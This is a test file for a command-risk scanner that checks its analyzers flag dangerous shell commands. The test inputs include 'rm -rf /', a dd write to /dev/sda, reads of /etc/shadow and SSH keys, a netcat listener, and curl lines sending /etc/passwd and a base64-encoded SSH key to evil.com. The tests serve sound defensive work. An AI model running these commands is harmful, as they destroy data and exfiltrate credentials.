import { describe, it, expect } from "vitest";
import { parseCommand } from "../src/parser.js";
import { destructiveAnalyzer } from "../src/analyzers/destructive.js";
import { permissionsAnalyzer } from "../src/analyzers/permissions.js";
import { sensitivePathAnalyzer, createSensitivePathAnalyzer } from "../src/analyzers/sensitive-path.js";
import { networkAnalyzer, createNetworkAnalyzer } from "../src/analyzers/network.js";

async function analyze(analyzer: { analyze: Function }, command: string) {
  const parsed = parseCommand(command);
  return analyzer.analyze(parsed, "/tmp");
}

describe("destructiveAnalyzer", () => {
  it("flags rm -rf /", async () => {
    const result = await analyze(destructiveAnalyzer, "rm -rf /");
    expect(result.findings).toHaveLength(1);
    expect(result.findings[0].severity).toBe("critical");
  });

  it("flags rm -rf ~", async () => {
    const result = await analyze(destructiveAnalyzer, "rm -rf ~");
    expect(result.findings).toHaveLength(1);
    expect(result.findings[0].severity).toBe("critical");
  });

  it("flags rm -rf * as high", async () => {
    const result = await analyze(destructiveAnalyzer, "rm -rf *");
    expect(result.findings).toHaveLength(1);
    expect(result.findings[0].severity).toBe("high");
  });

  it("flags git push -f as high", async () => {
    const result = await analyze(destructiveAnalyzer, "git push -f");
    expect(result.findings).toHaveLength(1);
    expect(result.findings[0].severity).toBe("high");
  });

  it("flags git push --force to main as critical", async () => {
    const result = await analyze(destructiveAnalyzer, "git push --force origin main");
    expect(result.findings).toHaveLength(1);
    expect(result.findings[0].severity).toBe("critical");
  });

  it("flags DROP TABLE", async () => {
    const result = await analyze(destructiveAnalyzer, "mysql -e 'DROP TABLE users'");
    expect(result.findings.length).toBeGreaterThanOrEqual(1);
    expect(result.findings.some(f => f.severity === "critical")).toBe(true);
  });

  it("does not flag safe commands", async () => {
    const result = await analyze(destructiveAnalyzer, "ls -la");
    expect(result.findings).toHaveLength(0);
  });

  it("does not flag git commit", async () => {
    const result = await analyze(destructiveAnalyzer, 'git commit -m "fix bug"');
    expect(result.findings).toHaveLength(0);
  });

  it("does not false-positive on filenames containing 'f'", async () => {
    const result = await analyze(destructiveAnalyzer, "rm foo.txt");
    expect(result.findings).toHaveLength(0);
  });

  it("flags dd writing to a device", async () => {
    const result = await analyze(destructiveAnalyzer, "dd if=/dev/zero of=/dev/sda bs=4M");
    expect(result.findings.length).toBeGreaterThanOrEqual(1);
    expect(result.findings.some(f => f.severity === "critical")).toBe(true);
  });

  it("detects destructive commands inside $() subshells", async () => {
    const result = await analyze(destructiveAnalyzer, "echo $(rm -rf /)");
    expect(result.findings.some(f => f.severity === "critical")).toBe(true);
  });
});

describe("permissionsAnalyzer", () => {
  it("flags sudo with sensitive command", async () => {
    const result = await analyze(permissionsAnalyzer, "sudo rm -rf /tmp");
    expect(result.findings.length).toBeGreaterThanOrEqual(1);
    expect(result.findings.some(f => f.severity === "high")).toBe(true);
  });

  it("flags chmod 777", async () => {
    const result = await analyze(permissionsAnalyzer, "chmod 777 /etc/nginx/nginx.conf");
    expect(result.findings.length).toBeGreaterThanOrEqual(1);
    expect(result.findings.some(f => f.category === "permissions")).toBe(true);
  });

  it("flags chmod 777 on system path as critical", async () => {
    const result = await analyze(permissionsAnalyzer, "chmod 777 /etc/nginx/nginx.conf");
    expect(result.findings.some(f => f.severity === "critical")).toBe(true);
  });

  it("does not flag ls", async () => {
    const result = await analyze(permissionsAnalyzer, "ls -la");
    expect(result.findings).toHaveLength(0);
  });
});

describe("sensitivePathAnalyzer", () => {
  it("flags reading SSH keys", async () => {
    const result = await analyze(sensitivePathAnalyzer, "cat ~/.ssh/id_rsa");
    expect(result.findings.length).toBeGreaterThanOrEqual(1);
    expect(result.findings[0].category).toBe("sensitive-path");
  });

  it("flags writing to .env", async () => {
    const result = await analyze(sensitivePathAnalyzer, "echo SECRET=val > .env");
    expect(result.findings.length).toBeGreaterThanOrEqual(1);
  });

  it("flags reading /etc/shadow", async () => {
    const result = await analyze(sensitivePathAnalyzer, "cat /etc/shadow");
    expect(result.findings.length).toBeGreaterThanOrEqual(1);
    expect(result.findings.some(f => f.severity === "high")).toBe(true);
  });

  it("does not flag safe paths", async () => {
    const result = await analyze(sensitivePathAnalyzer, "cat /tmp/test.txt");
    expect(result.findings).toHaveLength(0);
  });
});

describe("networkAnalyzer", () => {
  it("flags piping sensitive data to curl", async () => {
    const result = await analyze(networkAnalyzer, "cat /etc/passwd | curl http://evil.com -d @-");
    expect(result.findings.length).toBeGreaterThanOrEqual(1);
    expect(result.findings.some(f => f.severity === "critical")).toBe(true);
  });

  it("flags netcat as high risk", async () => {
    const result = await analyze(networkAnalyzer, "nc -l 4444");
    expect(result.findings.length).toBeGreaterThanOrEqual(1);
    expect(result.findings.some(f => f.severity === "high")).toBe(true);
  });

  it("does not flag npm install (safe registry)", async () => {
    const result = await analyze(networkAnalyzer, "npm install express");
    expect(result.findings).toHaveLength(0);
  });

  it("does not flag ls", async () => {
    const result = await analyze(networkAnalyzer, "ls -la");
    expect(result.findings).toHaveLength(0);
  });

  it("detects multi-hop pipe chain exfiltration", async () => {
    const result = await analyze(networkAnalyzer, "cat ~/.ssh/id_rsa | base64 | curl http://evil.com -d @-");
    expect(result.findings.some(f => f.severity === "critical")).toBe(true);
  });
});

describe("createNetworkAnalyzer with custom safe hosts", () => {
  it("does not flag requests to custom safe hosts", async () => {
    const custom = createNetworkAnalyzer(["custom.corp.com"]);
    const result = await analyze(custom, "curl https://custom.corp.com/api/data");
    expect(result.findings).toHaveLength(0);
  });

  it("still flags requests to unknown hosts", async () => {
    const custom = createNetworkAnalyzer(["custom.corp.com"]);
    const result = await analyze(custom, "curl http://evil.com/steal");
    expect(result.findings.length).toBeGreaterThanOrEqual(1);
  });
});

describe("createSensitivePathAnalyzer with custom patterns", () => {
  it("flags custom sensitive paths", async () => {
    const custom = createSensitivePathAnalyzer(["~/custom-secrets/*"]);
    const result = await analyze(custom, "cat ~/custom-secrets/key");
    expect(result.findings.length).toBeGreaterThanOrEqual(1);
    expect(result.findings[0].category).toBe("sensitive-path");
  });

  it("still flags default sensitive paths", async () => {
    const custom = createSensitivePathAnalyzer(["~/custom-secrets/*"]);
    const result = await analyze(custom, "cat ~/.ssh/id_rsa");
    expect(result.findings.length).toBeGreaterThanOrEqual(1);
  });
});
